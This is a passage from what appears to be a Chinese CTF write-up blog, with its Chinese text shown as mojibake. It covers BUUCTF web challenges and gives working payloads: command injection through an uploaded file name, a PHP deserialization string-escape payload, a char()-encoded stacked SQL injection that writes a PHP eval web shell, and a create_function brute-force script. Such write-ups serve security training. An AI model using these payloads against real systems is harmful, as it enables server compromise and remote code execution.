</span></span><span class="line"><span class="cl"><span class="nv">$size</span> <span class="o">=</span> <span class="mi">10000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span> <span class="o">=</span> <span class="s2">&#34;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error:can not move&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error:not an upload fileï¼&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$newfile</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;file upload success&lt;br /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$picdata</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34; | base64 -w 0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;img src=&#39;data:image/png;base64,&#34;</span><span class="o">.</span><span class="nv">$picdata</span><span class="o">.</span><span class="s2">&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Upload file error: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$allowtype</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$picdata</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34; | base64 -w 0&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå¯ä»¥ç”¨<code>;</code>æ‹¼æ¥å‘½ä»¤æ¥æ‰§è¡Œ</p>
<p>æ‰¾åˆ°å‰é¢èƒ½ä¸Šä¼ çš„åœ°æ–¹</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442.png"
	width="1824"
	height="695"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442_hu10228160531234192189.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442_hu5906908218851076777.png 1024w"
	loading="lazy"
	
		alt="image-20250426234534442"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="629px"
	
></p>
<p>æ–œæ è¢«è¿‡æ»¤äº†ï¼Œ<code>cd ..</code>å›ä¸Šçº§ç›®å½•ï¼Œå…¶å®åŠ ä¸ª#å°±ä¸ç”¨base64è§£ç äº†</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353.png"
	width="1870"
	height="710"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353_hu14568612527962215450.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353_hu9984196377056550042.png 1024w"
	loading="lazy"
	
		alt="image-20250426234701353"
	
	
		class="gallery-image" 
		data-flex-grow="263"
		data-flex-basis="632px"
	
></p>
<h2 id="gyctf2020easyphp">[GYCTF2020]Easyphp
</h2><p>www.zipä¸‹è½½æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$parm</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$array</span><span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;union&#39;</span><span class="p">,</span><span class="s1">&#39;regexp&#39;</span><span class="p">,</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="s1">&#39;into&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">,</span><span class="s1">&#39;insert&#39;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="s2">&#34;alter&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="s1">&#39;hacker&#39;</span><span class="p">,</span><span class="nv">$parm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$nickname</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="s1">&#39;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Info</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Info</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$CtrlCase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">CtrlCase</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dbCtrl</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">UpdateHelper</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sql</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">dbCtrl</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UpdateHelper</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:12:&#34;UpdateHelper&#34;:1:{s:3:&#34;sql&#34;;O:4:&#34;User&#34;:2:{s:3:&#34;age&#34;;s:70:&#34;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#34;;s:8:&#34;nickname&#34;;O:4:&#34;Info&#34;:1:{s:8:&#34;CtrlCase&#34;;O:6:&#34;dbCtrl&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:1:&#34;1&#34;;}}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ååºåˆ—åŒ–ç‚¹åœ¨è¿™é‡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$Info</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getNewinfo</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$age</span><span class="o">=</span><span class="nv">$Info</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$nickname</span><span class="o">=</span><span class="nv">$Info</span><span class="o">-&gt;</span><span class="na">nickname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$updateAction</span><span class="o">=</span><span class="k">new</span> <span class="nx">UpdateHelper</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span><span class="nv">$Info</span><span class="p">,</span><span class="s2">&#34;update user SET age=</span><span class="si">$age</span><span class="s2">,nickname=</span><span class="si">$nickname</span><span class="s2"> where id=&#34;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getNewInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$age</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$nickname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">safe</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Info</span><span class="p">(</span><span class="nv">$age</span><span class="p">,</span><span class="nv">$nickname</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>update.phpé‡Œé¢postä¼ ageå’Œnickname</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&#34;;s:8:&#34;CtrlCase&#34;;O:12:&#34;UpdateHelper&#34;:1:{s:3:&#34;sql&#34;;O:4:&#34;User&#34;:2:{s:3:&#34;age&#34;;s:70:&#34;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#34;;s:8:&#34;nickname&#34;;O:4:&#34;Info&#34;:1:{s:8:&#34;CtrlCase&#34;;O:6:&#34;dbCtrl&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:1:&#34;1&#34;;}}}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç”¨adminç™»å…¥</p>
<h2 id="suctf-2018multisql">[SUCTF 2018]MultiSQL
</h2><p>è¿™é‡Œåˆ©ç”¨sqlçš„é¢„å¤„ç†è¯­å¥</p>
<p>set çš„ä½œç”¨å°±æ˜¯å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå˜é‡çš„å‘½åå¿…é¡»æ˜¯@å¼€å¤´ã€‚</p>
<p>prepareå’Œexecute
prepareè¯­å¥ç”¨äºé¢„å®šä¹‰ä¸€ä¸ªè¯­å¥ï¼Œå¹¶å¯ä»¥æŒ‡å®šé¢„å®šä¹‰è¯­å¥åç§°ã€‚executeåˆ™æ˜¯æ‰§è¡Œé¢„å®šä¹‰è¯­å¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">select</span> <span class="err">â€˜</span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="n">_</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="err">â€™</span> <span class="n">into</span> <span class="n">outfile</span> <span class="err">â€˜</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">favicon</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">â€™</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨charç»•è¿‡waf</p>
<p>å…ˆè½¬è¿›åˆ¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">str</span><span class="o">=</span><span class="s2">&#34;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php&#39;;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">len_str</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">len_str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;char(</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;,</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè®¿é—®/favicon/shell.php</p>
<h2 id="suctf-2018annonymous">[SUCTF 2018]annonymous
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$MY</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;die(`cat flag.php`);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;function SUCTF_</span><span class="si">$hash</span><span class="s2">(){&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;global </span><span class="se">\$</span><span class="s2">MY;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;</span><span class="se">\$</span><span class="s2">MY();&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;func_name&#34;</span><span class="p">]();</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>hashéšæœºç”Ÿæˆæ•°å­—æ‹¼æ¥åˆ°ä¸‹é¢å‡½æ•°ä¸­ï¼Œè¿™ä¸ªéšæœºæ²¡åŠæ³•ï¼Œä½†æ˜¯<code>create_function</code>å‡½æ•°æœ‰ä¸ªæ¼æ´ï¼Œä¸Šæ¬¡æ<code>[HITCON 2017]Baby^h Master PHP</code>çš„æ—¶å€™é‡åˆ°äº†</p>
<p>ä¼šç”ŸæˆåŒ¿åå‡½æ•°<code>\0lambda_%d</code></p>
<p>é€šè¿‡å¤§é‡çš„è¯·æ±‚æ¥è¿«ä½¿<code>Pre-fork</code>æ¨¡å¼å¯åŠ¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://a10002f2-2091-47dc-9b7c-996d05cd4faa.node3.buuoj.cn/?func_name=</span><span class="si">%00la</span><span class="s1">mbda_1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-]&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786.png"
	width="628"
	height="122"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786_hu4782867223037075711.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786_hu14286701660442600549.png 1024w"
	loading="lazy"
	
		alt="image-20250427095941786"
	
	
		class="gallery-image" 
		data-flex-grow="514"
		data-flex-basis="1235px"
	
></p>
<h2 id="rootersctf2019babyweb">[RootersCTF2019]babyWeb
</h2><p>æŠ¥é”™æ³¨å…¥ï¼Œè¿‡æ»¤orç”¨||ç»•è¿‡</p>
<p>è¿‡æ»¤å•åŒå¼•å·ç”¨16è¿›åˆ¶ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
